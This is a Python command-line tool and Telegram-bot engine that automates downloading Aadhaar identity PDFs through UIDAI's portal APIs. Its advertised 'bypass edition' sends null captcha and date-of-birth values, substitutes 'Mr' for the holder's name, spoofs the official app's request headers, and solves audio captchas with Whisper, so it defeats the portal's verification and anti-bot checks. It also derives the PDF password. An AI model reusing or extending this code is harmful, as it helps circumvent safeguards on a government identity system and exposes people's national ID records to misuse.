#!/usr/bin/env python3
"""
Aadhaar downloader — standalone CLI + Telegram bot engine.

No cookies, no proxy — plain requests.Session() per user.
Bypass: dob:null, captcha:null, name Mr/skip.
Detailed logs + captcha audio/image for Telegram loading screen.
"""

from __future__ import annotations

import asyncio
import base64
import concurrent.futures
import json
import logging
import os
import re
import shutil
import uuid
from pathlib import Path
from typing import Any, Callable

import requests

try:
    import whisper
except ImportError:
    whisper = None  # type: ignore

try:
    from pydub import AudioSegment
except ImportError:
    AudioSegment = None  # type: ignore

log = logging.getLogger('aadhar')

SKIP_NAME_TOKENS = frozenset({
    'mr', 'mister', 'skip', 'unknown', 'unk', 'na', 'n/a', 'no', 'none', '?', '-', 'x', 'naam',
})

_WHISPER_MODEL = None
_AADHAR_EXECUTOR = concurrent.futures.ThreadPoolExecutor(
    max_workers=4, thread_name_prefix='aadhar',
)

AUDIO_CAPTCHA_URL = 'https://tathya.uidai.gov.in/audioCaptchaService/api/captcha/v3/generation'
IMAGE_CAPTCHA_URL = 'https://tathya.uidai.gov.in/captchaService/api/captcha/v3/generation'
EID_OTP_URL = 'https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid'
DOWNLOAD_OTP_URL = 'https://tathya.uidai.gov.in/unifiedAppAuthService/api/v2/generate/aadhaar/otp'
DOWNLOAD_PDF_URL = 'https://tathya.uidai.gov.in/downloadAadhaarService/api/aadhaar/download'

LogCb = Callable[[str], None]


def ensure_whisper_loaded() -> None:
    global _WHISPER_MODEL
    if whisper is None or _WHISPER_MODEL is not None:
        return
    try:
        model_name = os.getenv('WHISPER_MODEL', 'base').strip() or 'base'
        log.info('Loading Whisper %s…', model_name)
        _WHISPER_MODEL = whisper.load_model(model_name)
    except Exception as e:
        log.warning('Whisper preload skip: %s', e)


def _env_on(primary: str, secondary: str = '', default: str = '1') -> bool:
    val = os.getenv(primary, os.getenv(secondary, default) if secondary else default)
    return str(val).strip().lower() in ('1', 'true', 'yes', 'on')


def dob_bypass_on() -> bool:
    return _env_on('DOB_BYPASS', 'UIDAI_DOB_BYPASS', '1')


def captcha_bypass_on() -> bool:
    return _env_on('CAPTCHA_BYPASS', 'UIDAI_CAPTCHA_BYPASS', '1')


def get_headers(req_id: str) -> dict[str, str]:
    return {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://myaadhaar.uidai.gov.in',
        'Referer': 'https://myaadhaar.uidai.gov.in/',
        'User-Agent': (
            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
            '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
        ),
        'X-Request-ID': req_id,
        'transactionId': req_id,
        'appid': 'MYAADHAAR',
    }


def normalize_name(name: str) -> str:
    t = (name or '').strip().lower().rstrip('.')
    if not t or t in SKIP_NAME_TOKENS:
        return 'Mr'
    return ' '.join(str(name).split()).upper()


def resolve_dob(dob: str | None) -> str | None:
    if dob_bypass_on():
        return None
    dob = (dob or '').strip()
    if re.fullmatch(r'\d{2}/\d{2}/\d{4}', dob):
        return dob
    return None


def normalize_captcha(text: str) -> str:
    return re.sub(r'[^a-zA-Z0-9]', '', (text or '').strip().lower())[:8]


def pdf_password(name: str, dob: str | None) -> str:
    name_clean = re.sub(r'\s+', '', normalize_name(name))
    first_4 = name_clean[:4].upper()
    if len(first_4) < 4:
        first_4 = first_4 + ('A' * (4 - len(first_4)))
    if dob and '/' in dob:
        return first_4 + dob.split('/')[-1]
    return first_4


def is_success(resp: dict | None) -> bool:
    return bool(resp) and str(resp.get('status', '')).lower() == 'success'


def invalid_captcha(resp: dict | None) -> bool:
    return 'invalid Captcha' in str(resp or '')


def _b64_bytes(val: Any) -> bytes:
    if isinstance(val, bytes):
        return val
    s = str(val or '').strip()
    if s.startswith('data:'):
        s = s.split(',', 1)[-1]
    pad = len(s) % 4
    if pad:
        s += '=' * (4 - pad)
    try:
        return base64.b64decode(s)
    except Exception:
        return b''


def _short_json(obj: Any, limit: int = 280) -> str:
    try:
        s = json.dumps(obj, ensure_ascii=False)
    except Exception:
        s = str(obj)
    return s[:limit] + ('…' if len(s) > limit else '')


def request_timeout() -> tuple[int, int]:
    """(connect, read) seconds — hang avoid."""
    t = int(os.getenv('AADHAR_TIMEOUT', '20'))
    c = int(os.getenv('AADHAR_CONNECT_TIMEOUT', '8'))
    return (c, t)


class AadharSession:
    """Per-user requests.Session — Telegram /pdf engine with live logs."""

    def __init__(self, on_log: LogCb | None = None) -> None:
        self._session = requests.Session()
        self.on_log = on_log
        self.logs: list[str] = []
        self.name = ''
        self.mobile = ''
        self.dob_raw: str | None = None
        self.dob: str | None = None
        self.captcha_text = ''
        self.captcha_txn_id = ''
        self.otp_txn_id = ''
        self.download_otp_txn_id = ''
        self.eid = ''
        self.phase1_headers: dict[str, str] = {}
        self.phase2_headers: dict[str, str] = {}
        self.phase2_req_id = ''
        self.last_audio_bytes: bytes = b''
        self.last_captcha_image: bytes = b''
        self.last_phase = ''

    def _log(self, msg: str) -> None:
        line = (msg or '').strip()
        if not line:
            return
        self.logs.append(line)
        log.info(line)
        if self.on_log:
            try:
                self.on_log(line)
            except Exception:
                pass

    def setup(self, name: str, mobile: str, dob: str | None = None) -> None:
        self.name = normalize_name(name)
        self.mobile = mobile.strip()
        self.dob_raw = (dob or '').strip() or None
        self.dob = resolve_dob(self.dob_raw)
        self._log('=' * 40)
        self._log(f'[+] Setup: name={self.name} mobile={self.mobile}')
        if dob_bypass_on():
            self._log('[*] DOB bypass ON — dob:null')
        elif self.dob:
            self._log(f'[*] DOB: {self.dob}')
        else:
            self._log('[!] DOB missing — null')
        self._log(
            f'[*] Captcha bypass: {"ON" if captcha_bypass_on() else "OFF"} | '
            f'Whisper: {"ON" if whisper else "OFF"}'
        )
        self._log('[*] Direct connection — Indian VPS recommended')

    def _post(
        self,
        url: str,
        *,
        headers: dict[str, str],
        payload: dict[str, Any] | None = None,
        timeout: int | tuple[int, int] | None = None,
    ) -> requests.Response:
        """Direct POST to UIDAI APIs."""
        body = payload if payload is not None else {}
        tmo = timeout if timeout is not None else request_timeout()
        self._log(f'[*] POST {url.split("/")[-1]}… (timeout={tmo})')
        try:
            return self._session.post(
                url, headers=headers, json=body, timeout=tmo, proxies=None,
            )
        except requests.RequestException as e:
            self._log(f'[!] Request failed: {str(e)[:80]}')
            raise RuntimeError('UIDAI request failed — check network on Indian VPS') from e

    def _fetch_captcha_bundle(
        self, headers: dict[str, str], *, tag: str,
    ) -> dict[str, Any]:
        """Audio + optional image captcha — full API response."""
        self._log(f'[*] [{tag}] Requesting Audio Captcha…')
        payload = {'captchaLength': '6', 'captchaType': '2', 'audioCaptchaRequired': True}
        out: dict[str, Any] = {'audio_b64': '', 'txn': '', 'image_png': b'', 'raw': {}}
        try:
            r = self._post(AUDIO_CAPTCHA_URL, headers=headers, payload=payload)
            self._log(f'[*] [{tag}] Audio API HTTP {r.status_code}')
            if r.status_code != 200:
                self._log(f'[-] [{tag}] Body: {(r.text or "")[:200]}')
                return out
            data = r.json()
            out['raw'] = data
            audio = data.get('audioBase64') or data.get('audioCaptcha') or data.get('audio')
            txn = data.get('transactionId') or data.get('captchaTxnId') or data.get('txnId')
            img = (
                data.get('captchaImage') or data.get('image')
                or data.get('captcha') or ''
            )
            if audio:
                out['audio_b64'] = str(audio)
                self.last_audio_bytes = _b64_bytes(audio)
                self._log(f'[+] [{tag}] Audio OK — {len(self.last_audio_bytes)} bytes')
            if txn:
                out['txn'] = str(txn)
                self._log(f'[+] [{tag}] Captcha Txn ID: {txn}')
            if img:
                out['image_png'] = _b64_bytes(img)
                self.last_captcha_image = out['image_png']
                self._log(f'[+] [{tag}] Image in response — {len(self.last_captcha_image)} bytes')
        except Exception as e:
            self._log(f'[-] [{tag}] Audio captcha fail: {e}')

        if not out['image_png']:
            self._log(f'[*] [{tag}] Fetching image captcha fallback…')
            try:
                r2 = self._post(IMAGE_CAPTCHA_URL, headers=headers, payload={})
                self._log(f'[*] [{tag}] Image API HTTP {r2.status_code}')
                if r2.status_code == 200:
                    d2 = r2.json()
                    img2 = d2.get('captchaImage') or d2.get('image') or d2.get('captcha')
                    txn2 = d2.get('captchaTxnId') or d2.get('transactionId')
                    if img2:
                        self.last_captcha_image = _b64_bytes(img2)
                        out['image_png'] = self.last_captcha_image
                        self._log(f'[+] [{tag}] Image captcha — {len(self.last_captcha_image)} bytes')
                    if txn2 and not out['txn']:
                        out['txn'] = str(txn2)
                        self._log(f'[+] [{tag}] Image txn: {txn2}')
            except Exception as e:
                self._log(f'[-] [{tag}] Image captcha fail: {e}')
        return out

    def _decode_audio(self, b64: str, path: str) -> str:
        b64 = b64.strip()
        mp3_path = path if path.endswith('.mp3') else path.rsplit('.', 1)[0] + '.mp3'
        self.last_audio_bytes = _b64_bytes(b64)
        with open(mp3_path, 'wb') as f:
            f.write(self.last_audio_bytes)
        if AudioSegment is not None:
            try:
                AudioSegment.from_file(mp3_path).export(path, format='wav')
                if os.path.exists(mp3_path) and path != mp3_path:
                    os.remove(mp3_path)
                return path
            except Exception as e:
                self._log(f'[!] pydub skip: {e}')
        return mp3_path

    def _whisper(self, audio_path: str, *, tag: str) -> str:
        global _WHISPER_MODEL
        if whisper is None:
            self._log(f'[-] [{tag}] Whisper not installed')
            return ''
        self._log(f'[*] [{tag}] Whisper transcribe…')
        if _WHISPER_MODEL is None:
            _WHISPER_MODEL = whisper.load_model(os.getenv('WHISPER_MODEL', 'base'))
        result = _WHISPER_MODEL.transcribe(audio_path, language='en', fp16=False)
        text = str(result.get('text') or '')
        cap = text.replace(' ', '').replace('.', '').replace(',', '').strip().lower()
        self._log(f'[====> [{tag}] Whisper raw: {text[:60]}')
        self._log(f'[====> [{tag}] Captcha solved: {cap or "(empty)"} <====]')
        return cap

    def _captcha_pair(self, text: str, txn: str) -> tuple[str | None, str | None]:
        if captcha_bypass_on() and not text:
            return None, txn or None
        cap = normalize_captcha(text) if text else None
        return cap, txn or None

    def _solve_captcha_auto(self, headers: dict[str, str], tag: str) -> tuple[str, str]:
        self.last_phase = tag
        bundle = self._fetch_captcha_bundle(headers, tag=tag)
        txn = bundle.get('txn') or ''
        audio_b64 = bundle.get('audio_b64') or ''
        if bundle.get('image_png'):
            self.last_captcha_image = bundle['image_png']

        if not txn:
            self._log(f'[-] [{tag}] captchaTxnId missing')
            return '', ''

        self.captcha_txn_id = txn
        if captcha_bypass_on():
            self._log(f'[*] [{tag}] captcha:null bypass try (txn={txn[:12]}…)')
            return '', txn

        if audio_b64:
            audio_path = self._decode_audio(audio_b64, f'audio_{tag}.wav')
            solved = self._whisper(audio_path, tag=tag)
            if solved and 'error' not in solved:
                return solved, txn
            if os.path.exists(audio_path):
                shutil.copy(audio_path, f'failed_{tag}_{txn}.mp3')

        self._log(f'[!] [{tag}] Auto captcha failed — manual needed')
        return '', txn

    def _whisper_retry(self, headers: dict[str, str], tag: str) -> str:
        self._log(f'[*] [{tag}] Bypass failed — Whisper retry…')
        bundle = self._fetch_captcha_bundle(headers, tag=f'{tag}-retry')
        audio_b64 = bundle.get('audio_b64') or ''
        if not audio_b64:
            return ''
        audio_path = self._decode_audio(audio_b64, f'audio_{tag}_retry.wav')
        return self._whisper(audio_path, tag=f'{tag}-retry')

    def _request_eid_otp(self, cap: str, txn: str, headers: dict[str, str], *, tag: str) -> dict | None:
        c, t = self._captcha_pair(cap, txn)
        cap_label = 'null' if c is None else c
        self._log(f"[*] [{tag}] EID OTP request — captcha:'{cap_label}' txn:{(txn or '')[:12]}")
        payload = {
            'mobileNumber': self.mobile,
            'dob': self.dob,
            'email': None,
            'name': self.name,
            'option': 'EID',
            'otp': None,
            'otpTxnId': None,
            'captchaTxnId': t,
            'captcha': c,
            'resendOtp': False,
        }
        self._log(f'[*] [{tag}] POST {EID_OTP_URL}')
        self._log(f'[*] [{tag}] Payload: {_short_json(payload)}')
        try:
            r = self._post(EID_OTP_URL, headers=headers, payload=payload)
            self._log(f'[*] [{tag}] Response HTTP {r.status_code}')
            data = r.json()
            self._log(f'[*] [{tag}] Response: {_short_json(data)}')
            return data
        except Exception as e:
            self._log(f'[-] [{tag}] EID OTP network fail: {e}')
            return None

    def _result_base(self) -> dict[str, Any]:
        return {
            'logs': list(self.logs),
            'captcha_text': self.captcha_text,
            'captcha_txn_id': self.captcha_txn_id,
            'audio_bytes': self.last_audio_bytes,
            'image_png': self.last_captcha_image,
        }

    def phase1_start(self) -> dict[str, Any]:
        self._log('PHASE 1 — EID RETRIEVAL START')
        rid = str(uuid.uuid4())
        self.phase1_headers = get_headers(rid)
        self._log(f'[*] Phase1 req_id: {rid[:8]}…')

        cap, txn = self._solve_captcha_auto(self.phase1_headers, 'phase1')
        self.captcha_text = cap
        self.captcha_txn_id = txn

        if not txn:
            return {**self._result_base(), 'otp_ok': False, 'needs_captcha': True, 'msg': 'Captcha txn missing'}

        resp = self._request_eid_otp(cap, txn, self.phase1_headers, tag='phase1')
        if invalid_captcha(resp) and captcha_bypass_on():
            self._log('[-] phase1 captcha:null failed — Whisper retry')
            cap = self._whisper_retry(self.phase1_headers, 'phase1')
            if cap:
                self.captcha_text = cap
                resp = self._request_eid_otp(cap, txn, self.phase1_headers, tag='phase1-retry')

        if not is_success(resp):
            err = _short_json(resp) if resp else 'no response'
            if invalid_captcha(resp):
                return {**self._result_base(), 'otp_ok': False, 'needs_captcha': True, 'msg': err}
            return {**self._result_base(), 'otp_ok': False, 'msg': err}

        self.otp_txn_id = (resp.get('responseData') or {}).get('otpTxnId') or ''
        self._log(f'[+] Phase1 OTP sent! otpTxnId={self.otp_txn_id[:12]}…')
        return {**self._result_base(), 'otp_ok': True, 'msg': 'OTP 1 sent to mobile'}

    def phase1_otp_manual(self, captcha: str) -> dict[str, Any]:
        cap = normalize_captcha(captcha)
        self.captcha_text = cap
        self._log(f'[*] Manual captcha phase1: {cap}')
        if not self.phase1_headers:
            rid = str(uuid.uuid4())
            self.phase1_headers = get_headers(rid)
        resp = self._request_eid_otp(cap, self.captcha_txn_id, self.phase1_headers, tag='phase1-manual')
        if not is_success(resp):
            return {**self._result_base(), 'otp_ok': False, 'msg': _short_json(resp)}
        self.otp_txn_id = (resp.get('responseData') or {}).get('otpTxnId') or ''
        return {**self._result_base(), 'otp_ok': True, 'msg': 'OTP 1 sent'}

    def phase1_verify(self, otp: str) -> dict[str, Any]:
        self._log(f'[*] Phase1 verify OTP: {otp[:2]}****')
        c, t = self._captcha_pair(self.captcha_text, self.captcha_txn_id)
        payload = {
            'mobileNumber': self.mobile,
            'email': None,
            'dob': self.dob,
            'name': self.name,
            'option': 'EID',
            'otp': otp.strip(),
            'otpTxnId': self.otp_txn_id,
            'captchaTxnId': t,
            'captcha': c,
            'resendOtp': False,
        }
        self._log(f'[*] POST {EID_OTP_URL} (verify)')
        try:
            r = self._post(EID_OTP_URL, headers=self.phase1_headers, payload=payload)
            resp = r.json()
            self._log(f'[*] Verify HTTP {r.status_code}: {_short_json(resp)}')
        except Exception as e:
            return {**self._result_base(), 'retrieve_ok': False, 'msg': str(e)}

        if not is_success(resp):
            return {**self._result_base(), 'retrieve_ok': False, 'msg': _short_json(resp)}

        self.eid = str((resp.get('responseData') or {}).get('eidNumber') or '')
        self._log(f'[+] EID Retrieved: {self.eid[:6]}…{self.eid[-4:] if len(self.eid) > 10 else self.eid}')
        return {**self._result_base(), 'retrieve_ok': bool(self.eid), 'eid': self.eid, 'msg': 'EID retrieved'}

    def _request_download_otp(self, cap: str, txn: str, *, tag: str) -> dict | None:
        c, t = self._captcha_pair(cap, txn)
        cap_label = 'null' if c is None else c
        self._log(f"[*] [{tag}] Download OTP — captcha:'{cap_label}'")
        payload = {
            'eidNumber': self.eid,
            'idType': 'eid',
            'captchaTxnId': t,
            'captchaValue': c,
            'transactionId': self.phase2_req_id,
            'resendOTP': False,
        }
        self._log(f'[*] POST {DOWNLOAD_OTP_URL}')
        self._log(f'[*] Payload: {_short_json(payload)}')
        try:
            r = self._post(DOWNLOAD_OTP_URL, headers=self.phase2_headers, payload=payload)
            data = r.json()
            self._log(f'[*] [{tag}] HTTP {r.status_code}: {_short_json(data)}')
            return data
        except Exception as e:
            self._log(f'[-] [{tag}] Download OTP fail: {e}')
            return None

    def phase2_start(self) -> dict[str, Any]:
        self._log('PHASE 2 — AADHAAR DOWNLOAD START')
        if not self.eid:
            return {**self._result_base(), 'otp_ok': False, 'msg': 'EID missing'}

        self.phase2_req_id = str(uuid.uuid4())
        self.phase2_headers = get_headers(self.phase2_req_id)
        self._log(f'[*] Phase2 req_id: {self.phase2_req_id[:8]}…')

        cap, txn = self._solve_captcha_auto(self.phase2_headers, 'phase2')
        self.captcha_text = cap
        self.captcha_txn_id = txn

        if not txn:
            return {**self._result_base(), 'otp_ok': False, 'needs_captcha': True, 'msg': 'Phase 2 captcha failed'}

        resp = self._request_download_otp(cap, txn, tag='phase2')
        if invalid_captcha(resp) and captcha_bypass_on():
            self._log('[-] phase2 captcha:null failed — Whisper retry')
            cap = self._whisper_retry(self.phase2_headers, 'phase2')
            if cap:
                self.captcha_text = cap
                resp = self._request_download_otp(cap, txn, tag='phase2-retry')

        if not is_success(resp):
            err = _short_json(resp) if resp else 'no response'
            if invalid_captcha(resp):
                return {**self._result_base(), 'otp_ok': False, 'needs_captcha': True, 'msg': err}
            return {**self._result_base(), 'otp_ok': False, 'msg': err}

        self.download_otp_txn_id = str(resp.get('txnId') or '')
        self._log(f'[+] Phase2 OTP sent! txnId={self.download_otp_txn_id[:12]}…')
        return {**self._result_base(), 'otp_ok': True, 'msg': 'OTP 2 sent for PDF download'}

    def phase2_otp_manual(self, captcha: str) -> dict[str, Any]:
        cap = normalize_captcha(captcha)
        self.captcha_text = cap
        self._log(f'[*] Manual captcha phase2: {cap}')
        if not self.phase2_headers:
            self.phase2_req_id = str(uuid.uuid4())
            self.phase2_headers = get_headers(self.phase2_req_id)
        resp = self._request_download_otp(cap, self.captcha_txn_id, tag='phase2-manual')
        if not is_success(resp):
            return {**self._result_base(), 'otp_ok': False, 'msg': _short_json(resp)}
        self.download_otp_txn_id = str(resp.get('txnId') or '')
        return {**self._result_base(), 'otp_ok': True, 'msg': 'OTP 2 sent'}

    def phase2_download(self, otp: str) -> dict[str, Any]:
        self._log(f'[*] Phase2 PDF download OTP: {otp[:2]}****')
        payload = {
            'eid': self.eid,
            'mask': False,
            'otp': otp.strip(),
            'otpTxnId': self.download_otp_txn_id,
        }
        self._log(f'[*] POST {DOWNLOAD_PDF_URL}')
        try:
            r = self._post(DOWNLOAD_PDF_URL, headers=self.phase2_headers, payload=payload)
            resp = r.json()
            self._log(f'[*] Download HTTP {r.status_code}: {_short_json(resp)}')
        except Exception as e:
            return {**self._result_base(), 'download_ok': False, 'msg': str(e)}

        if not is_success(resp):
            return {**self._result_base(), 'download_ok': False, 'msg': _short_json(resp)}

        b64 = (resp.get('data') or {}).get('aadhaarPdf')
        if not b64:
            return {**self._result_base(), 'download_ok': False, 'msg': 'aadhaarPdf missing'}

        try:
            pdf_bytes = base64.b64decode(b64)
        except Exception:
            return {**self._result_base(), 'download_ok': False, 'msg': 'PDF decode failed'}

        self._log(f'[+] PDF OK — {len(pdf_bytes)} bytes')
        return {**self._result_base(), 'download_ok': True, 'pdf_bytes': pdf_bytes, 'msg': 'PDF ready'}


AADHAR_SESSIONS: dict[int, AadharSession] = {}


def get_aadhar_session(chat_id: int) -> AadharSession | None:
    return AADHAR_SESSIONS.get(chat_id)


def clear_aadhar_session(chat_id: int) -> None:
    AADHAR_SESSIONS.pop(chat_id, None)


def attach_log_callback(sess: AadharSession, loop: asyncio.AbstractEventLoop, progress: Any) -> None:
    """Thread-safe log → Telegram loading screen."""

    def on_log(line: str) -> None:
        asyncio.run_coroutine_threadsafe(progress.log_detail(line), loop)

    sess.on_log = on_log


async def send_captcha_to_bot(update: Any, result: dict[str, Any], *, phase: str) -> None:
    """Send audio + image captcha to Telegram."""
    if not update or not update.message:
        return
    cap = result.get('captcha_text') or ''
    txn = result.get('captcha_txn_id') or ''
    audio = result.get('audio_bytes') or b''
    png = result.get('image_png') or b''

    cap_line = f'🔐 {phase} Captcha'
    if cap:
        cap_line += f'\nSolved: {cap}'
    if txn:
        cap_line += f'\nTxn: {txn[:20]}'

    if audio and len(audio) > 100:
        try:
            await update.message.reply_audio(
                audio=audio,
                filename=f'{phase.lower()}_captcha.mp3',
                caption=f'{cap_line}\n🎧 Audio captcha',
            )
        except Exception:
            try:
                await update.message.reply_document(
                    document=audio,
                    filename=f'{phase.lower()}_captcha.mp3',
                    caption=cap_line,
                )
            except Exception:
                pass

    if png and len(png) > 200:
        try:
            await update.message.reply_photo(
                photo=png,
                caption=cap_line + '\n🖼 Image captcha',
            )
        except Exception:
            pass
    elif cap:
        await update.message.reply_text(cap_line)


async def run_aadhar(fn: Callable[..., Any], *args: Any, **kwargs: Any) -> Any:
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(
        _AADHAR_EXECUTOR,
        lambda: fn(*args, **kwargs),
    )


def main() -> None:
    print('=' * 60)
    print('AUTOMATED AADHAAR DOWNLOADER (bypass edition)')
    print(f'DOB bypass: {"ON" if dob_bypass_on() else "OFF"}')
    print(f'Captcha bypass: {"ON" if captcha_bypass_on() else "OFF"}')
    print('=' * 60)

    raw_name = input('[>>>] Full Name (or Mr/skip): ').strip()
    u_dob_input = input('[>>>] DOB DD/MM/YYYY: ').strip()
    u_mobile = input('[>>>] Mobile: ').strip()

    sess = AadharSession(on_log=print)
    sess.setup(raw_name, u_mobile, u_dob_input)
    pwd = pdf_password(sess.name, sess.dob_raw if not dob_bypass_on() else None)
    print(f'[+] PDF password hint: {pwd}\n')

    r1 = sess.phase1_start()
    if not r1.get('otp_ok'):
        if r1.get('needs_captcha'):
            cap = input('[>>>] Phase 1 captcha: ').strip()
            r1 = sess.phase1_otp_manual(cap)
        if not r1.get('otp_ok'):
            print('[-] Phase 1 OTP fail:', r1.get('msg'))
            return

    otp1 = input('[>>>] Phase 1 OTP: ').strip()
    v1 = sess.phase1_verify(otp1)
    if not v1.get('retrieve_ok'):
        print('[-] EID fail:', v1.get('msg'))
        return

    r2 = sess.phase2_start()
    if not r2.get('otp_ok'):
        if r2.get('needs_captcha'):
            cap2 = input('[>>>] Phase 2 captcha: ').strip()
            r2 = sess.phase2_otp_manual(cap2)
        if not r2.get('otp_ok'):
            print('[-] Phase 2 OTP fail:', r2.get('msg'))
            return

    otp2 = input('[>>>] Phase 2 OTP: ').strip()
    dl = sess.phase2_download(otp2)
    if not dl.get('download_ok'):
        print('[-] Download fail:', dl.get('msg'))
        return

    fn = f'{pwd[:4]}_Aadhaar.pdf'
    with open(fn, 'wb') as f:
        f.write(dl['pdf_bytes'])
    print(f'[✔] Saved {fn} — password: {pwd}')


if __name__ == '__main__':
    main()
